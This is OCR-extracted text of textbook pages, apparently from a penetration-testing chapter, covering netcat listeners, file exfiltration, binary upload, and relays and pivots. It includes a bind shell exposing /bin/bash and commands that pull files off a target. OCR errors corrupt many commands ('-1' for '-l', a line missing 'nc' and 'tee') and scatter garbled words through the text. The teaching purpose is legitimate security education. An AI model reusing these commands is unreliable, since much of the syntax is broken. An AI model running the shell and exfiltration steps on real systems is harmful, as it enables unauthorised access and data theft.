- pgno: 197
  md: '# Using Netcat to Create Connections and Move Data and Binaries


    Netcat (nc) is a universal tool for network administrators and security testers.
    It runs on Windows, Linux, and Unix. Netcat is simple in concept; it connects
    standard input/output (I/O) to local and remote ports using ordinary Transfer
    Control Protocol (TCP) by default. You can set up a simple TCP listener to relay
    data to standard output like this:


    ```

    Target # nc -1 -p 80

    ```


    > TIP You can find a very useful Netcat command at www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf.


    Netcat is in listening mode on port 80 (-p 80). You can set up a remote connection
    to this listener on 10.10.100.10 with the following command:


    ```

    Tester # nc 10.10.100.10 80

    ```


    Now you have a two-way connection. Either side can send data that is seen by the
    other. As soon as one side disconnects, both connections terminate. You use port
    80 because ports 80 and 443 are heavily used by web servers, they''re less likely
    to be blocked by firewalls, and they''re unlikely to be logged as suspicious activity,
    such as IDS alerts.


    > NOTE Host-hosted binaries may still block your traffic; the “Managing Services”
    section of Chapter 4 for information on how to disable or open ports. Make sure
    to reenable the ports for the test.


    You can use this behavior to move data and forth by redirecting standard I/O.
    For example, to download a file from a target machine (like an exfiltration) using
    the following command:


    ```

    Target # cat file.txt | nc -1 -p 80

    Tester # -q0 10.10.100.10 80 | file.txt

    ```


    Target''s standard input sends file.txt across to the Tester''s output, which
    is displayed and saved by the tee command. The Tester terminates the connection
    at the end of the file with the option -q0.


    This works for binary files, for example, to upload an executable file for use,
    using the following command:


    ```

    Target # nc -1 -p 80 > binary.exe

    Tester # cat binary.exe | nc -10 10.10.100.10 80

    ```


    A file is sent to the Tester''s standard input, which is sent remotely to the
    Target''s standard output and is saved as binary.exe.'
  merge: -1
  img_proc: true
- pgno: 198
  md: '# Chapter 8 = Penetration Testing 173


    # Using Netcat to Create Relays and Pivots


    You can chain together netcat connections to create relays. The following example
    is where netcat is used on three machines:


    ```

    Target (.30) # nc -l -p 80

    Relay Setup # mknod FIFO p

    Relay (.10) # nc -l -p 200 < FIFO | nc 10.10.100.30 80 > FIFO

    Tester # nc -10 10.10.100.30 80

    ```


    These commands set up a bidirectional connection similar to the first netcat example,
    but now there is a relay between the ends points. The mknod command creates a
    special file that is first-in-first (FIFO) using the p option sends whatever it
    receives to its standard output. The Relay machine has two netcats: One pipes
    its output to the other netcat, which is a remote sender. Text from Tester is
    piped to Target via the ordinary pipe on Relay.


    The FIFO carries the reverse connection; it takes the standard output of Relay''s
    connection to Target and sends it to the standard input of Relay''s listener.
    The order of these commands sometimes matters. Customarily, you start netcat listeners
    first and then start remote netcat connections. The following example starts both
    netcat listeners and then starts the outgoing connections from Windows.


    To set up a relay on a Windows system (10.10.100.90), with a remote Linux command
    shell, you could execute commands like this:


    > NOTE On newer Windows, these commands may alert User Account Control (UAC) because
    a new program, netcat, is accessing the network. Administrative privileges can
    grant netcat access with UAC.


    ```

    Target (.30) # nc -l -p 80 -e /bin/bash

    Relay Setup C:\> echo nc 10.10.100.30 80 > connect.bat

    Relay (.90) C:\> nc 10.10.100.20 -e connect.bat

    Tester (.20) # nc -1 -p 80

    ```


    First, Target starts a netcat listener running a Bash shell; then the listener
    is started. The Relay creates a batch script called connect.bat that implements
    the connection to Target. The second netcat command makes an outgoing connection
    to Tester and executes connect.bat. The relay listener receives and transmits
    on the connection with Tester, and the connect.bat script sends and receives on
    the connection to Target.'
  merge: -1
  img_proc: true
- pgno: 199
  md: 'The disadvantage of this form of relay is that it''s not as readily extendable.
    For example, you could not put two Windows relays in a row like this. The following
    code shows an alternative way, which is extensible, to set up the Windows relay:


    ```

    Target (.30) # nc -1 -p 80 -e /bin/bash

    Relay Setup C:\> echo nc 10.10.100.30 > connect.bat

    Relay (.90) C:\> echo nc -1 -p 80 connect.bat

    Tester # nc -10 10.10.100.90 80

    ```


    This example works like the original Linux선. Tester sends and receives from a
    listener on the relay, which in turn sends and receives from a remote connection
    to Target.


    Because of trust relationships between computers, relays are very useful for testers.
    A tester explores a first machine on a target network, and then he pivots attention
    to other machines on the subnet. Uses the trusted identity of the first exploited
    machines to fuel other machines, as they upload and launch attacks from inside
    their networks.


    When a second machine is accessed, the tester sets up a relay on the first, and
    relaunches the attacks from the new target, exploiting in-scope target boxes from
    each pivot machine.


    The shells you created with relays are raw command shells, which are commonplace
    after gaining access with an exploit. Raw shells have no provisions for shell
    prompts, backspaces (mistyping), or control characters. Ctrl+C stops netcat and
    Metasploit and disconnects. The most serious limitations are your inability to
    run editors (for example, vi or edit), and your inability to respond to password
    prompts, drop the connection.


    The single command-line scripting techniques in Chapter 6 are ideal for raw shells
    such as net use on Windows and using nc --telnet as a script to Telnet sessions.


    On Windows, you could upload binary files using Netcat and install services such
    as secure shell (SSH) and Telnet to establish terminal services. SSH is likely
    to be installed on Linux, but you might have to start the daemon, sshd. SSH also
    supports Secure File Transfer Protocol (SFTP), a very convenient way to move data.


    > NOTE Use either sshd start or /etc/init/sshd start depending on the Linux lineage.
    The former is characteristic of Red Hat and the latter of Debian Linux, such as
    Ubuntu.


    Another, (usually less attractive) alternative for connecting to remote systems
    is to start desktop services, such as Remote Desktop Protocol (RDP) or Virtual
    Network Computing (VNC). These are significant system changes that will'
